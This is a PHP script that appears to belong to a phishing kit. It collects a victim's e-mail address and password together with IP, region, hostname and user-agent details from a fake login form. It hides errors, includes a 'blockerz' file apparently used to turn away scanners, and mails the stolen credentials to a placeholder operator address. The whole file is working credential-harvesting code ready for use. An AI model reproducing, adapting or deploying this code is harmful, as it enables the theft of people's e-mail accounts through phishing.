
<?php @error_reporting(0);

define('Secure', TRUE);

include '../blockerz/index.php';

if(isset($_POST['username']) && isset($_POST['password'])){

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message = "";
$message .= "====================================================\n";
$message .= ' apiCountry   : '.$_POST['apiCountry']."\n";
$message .= ' apiIP Adress :'  .$_POST['ip']."\n";
$message .= ' Region       : '.$_POST['region']."\n";
$message .= ' User Agent   : '.$_POST['agent']."\n";
$message .= ' E-mail       : '. $_POST['username']."\n";
$message .= ' E-mail Pass  : '. $_POST['password']."\n" ;
$message .= "====================================================\n";
$message .= " IP Address: $ip\n";
$message .= " HostName  : $hostname\n";
$message .= "====================================================\n";

$to="your email goes here";
$subject = "Your Stuff here";
$headers = "From: You";
$headers = "MIME-Version: 1.0\n";
mail($to, $subject, $message, $headers);

 }

